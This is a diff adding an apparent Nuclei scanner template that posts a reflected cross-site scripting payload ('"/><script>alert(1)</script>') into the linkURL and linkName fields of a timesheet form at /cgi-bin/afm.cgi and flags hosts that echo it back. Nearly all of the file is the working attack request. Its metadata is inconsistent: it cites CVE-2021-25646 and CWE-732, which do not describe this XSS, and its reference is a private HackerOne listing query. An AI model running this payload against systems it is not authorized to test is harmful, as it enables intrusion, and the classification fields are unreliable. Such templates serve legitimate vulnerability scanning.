@@ -1,0 +1,47 @@
+id: att-xss-dansf
+
+info:
+  name: XSS post based 
+  author: pikpikcu
+  severity: high
+  reference: https://hackerone.com/bugs?subject=user&report_id=1439300&view=all&substates%5B%5D=editing&substates%5B%5D=pre-submission&substates%5B%5D=new&substates%5B%5D=triaged&substates%5B%5D=needs-more-info&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=spam&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+  description: |
+    custom
+    xss
+  tags: custom
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.80
+    cve-id: CVE-2021-25646
+    cwe-id: CWE-732
+
+requests:
+  - raw:
+      - |
+        POST /cgi-bin/afm.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 3547
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        to=info&from=asd&linkURL=http%3A%2F%2Fwww.pxqa5fwu3p5lgp2el7g2dxiu5lbbz0.burpcollaborator.net%2Findex.htm%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&linkName=http%3A%2F%2Fwww.pxqa5fwu3p5lgp2el7g2dxiu5lbbz0.burpcollaborator.net%2Findex.htm%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&subject=asd+Time+Sheet+01&required=signature&order=employee1_summary%2Cemployee2_summary%2Cemployee3_summary%2Cemployee4_summary%2Cemployee5_summary%2Csignature%2Csigchk%2CWeekEnding1%2CWeekEnding2%2Cstoreno%2Cemp1name%2Creg2wk1%2Covr2wk1%2CFrmMon1_1%2CToMon1_1%2CHrsMon1_1%2CHolMon1_1%2CVacaMon1_1%2CMonSum1_1%2CSickMon1_1%2CFrmTue1_1%2CToTue1_1%2CHrsTue1_1%2CHolTue1_1%2CVacaTue1_1%2CTueSum1_1%2CSickTue1_1%2CFrmWed1_1%2CToWed1_1%2CHrsWed1_1%2CHolWed1_1%2CVacaWed1_1%2CWedSum1_1%2CSickWed1_1%2CFrmThu1_1%2CToThu1_1%2CHrsThu1_1%2CHolThu1_1%2CVacaThu1_1%2CThuSum1_1%2CSickThu1_1%2CFrmFri1_1%2CToFri1_1%2CHrsFri1_1%2CHolFri1_1%2CVacaFri1_1%2CFriSum1_1%2CSickFri1_1%2CFrmSat1_1%2CToSat1_1%2CHrsSat1_1%2CHolSat1_1%2CVacaSat1_1%2CSatSum1_1%2CSickSat1_1%2CFrmSun1_1%2CToSun1_1%2CHrsSun1_1%2CHolSun1_1%2CVacaSun1_1%2CSunSum1_1%2CSickSun1_1%2Cweek1sum_employee1%2Cweek1over1%2CFrmMon2_1%2CToMon2_1%2CHrsMon2_1%2CHolMon2_1%2CVacaMon2_1%2CMonSum2_1%2CSickMon2_1%2CFrmTue2_1%2CToTue2_1%2CHrsTue2_1%2CHolTue2_1%2CVacaTue2_1%2CTueSum2_1%2CSickTue2_1%2CFrmWed2_1%2CToWed2_1%2CHrsWed2_1%2CHolWed2_1%2CVacaWed2_1%2CWedSum2_1%2CSickWed2_1%2CFrmThu2_1%2CToThu2_1%2CHrsThu2_1%2CHolThu2_1%2CVacaThu2_1%2CThuSum2_1%2CSickThu2_1%2CFrmFri2_1%2CToFri2_1%2CHrsFri2_1%2CHolFri2_1%2CVacaFri2_1%2CFriSum2_1%2CSickFri2_1%2CFrmSat2_1%2CToSat2_1%2CHrsSat2_1%2CHolSat2_1%2CVacaSat2_1%2CSatSum2_1%2CSickSat2_1%2CFrmSun2_1%2CToSun2_1%2CHrsSun2_1%2CHolSun2_1%2CVacaSun2_1%2CSunSum2_1%2CSickSun2_1%2Cweek2sum_employee1%2Cweek2over1%2Ccomment1%2C&empty_fields=yes&bgcolor=White&color=Black&title=Thanks+for+your+Time+Sheet%21&name=asddda&WeekEnding1=1%2F12%2F2022&WeekEnding2=1%2F18%2F2022&emp1name=asdddd&employee1_summary=asd+asd+had+0+regular+hours+and+0+overtime+for+week+ending+1%2F18%2F2022+and+signed+by+asdasd&FrmMon1_1=0.0001&ToMon1_1=0.0001&HrsMon1_1=0&HolMon1_1=&VacaMon1_1=&MonSum1_1=0&SickMon1_1=&FrmMon2_1=0.0001&ToMon2_1=0.0001&HrsMon2_1=0&HolMon2_1=&VacaMon2_1=&MonSum2_1=0&SickMon2_1=&FrmTue1_1=0.0001&ToTue1_1=0.0001&HrsTue1_1=0&HolTue1_1=&VacaTue1_1=&TueSum1_1=0&SickTue1_1=&FrmTue2_1=0.0001&ToTue2_1=0.0001&HrsTue2_1=0&HolTue2_1=&VacaTue2_1=&TueSum2_1=0&SickTue2_1=&FrmWed1_1=0.0001&ToWed1_1=0.0001&HrsWed1_1=0&HolWed1_1=&VacaWed1_1=&WedSum1_1=0&SickWed1_1=&FrmWed2_1=0.0001&ToWed2_1=0.0001&HrsWed2_1=0&HolWed2_1=&VacaWed2_1=&WedSum2_1=0&SickWed2_1=&FrmThu1_1=0.0001&ToThu1_1=0.0001&HrsThu1_1=0&HolThu1_1=&VacaThu1_1=&ThuSum1_1=0&SickThu1_1=&FrmThu2_1=0.0001&ToThu2_1=0.0001&HrsThu2_1=0&HolThu2_1=&VacaThu2_1=&ThuSum2_1=0&SickThu2_1=&FrmFri1_1=0.0001&ToFri1_1=0.0001&HrsFri1_1=0&HolFri1_1=&VacaFri1_1=&FriSum1_1=0&SickFri1_1=&FrmFri2_1=0.0001&ToFri2_1=0.0001&HrsFri2_1=0&HolFri2_1=&VacaFri2_1=&FriSum2_1=0&SickFri2_1=&FrmSat1_1=0.0001&ToSat1_1=0.0001&HrsSat1_1=0&HolSat1_1=&VacaSat1_1=&SatSum1_1=0&SickSat1_1=&FrmSat2_1=0.0001&ToSat2_1=0.0001&HrsSat2_1=0&HolSat2_1=&VacaSat2_1=&SatSum2_1=0&SickSat2_1=&FrmSun1_1=0.0001&ToSun1_1=0.0001&HrsSun1_1=0&HolSun1_1=&VacaSun1_1=&SunSum1_1=0&SickSun1_1=&FrmSun2_1=0.0001&ToSun2_1=0.0001&HrsSun2_1=0&HolSun2_1=&VacaSun2_1=&SunSum2_1=0&SickSun2_1=&week1sum_employee1=0&week2sum_employee1=0&reg2wk1=0&comment1=asdsa&week1over1=0&week2over1=0&ovr2wk1=0&todaystamp=01%2F02%2F22_12%3A49%3A58&signature=asdasd&asddd=asd1121&xaxaxa=asd1121
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: word
+        words:
+          - '"/><script>alert(1)</script>'
+        part: body
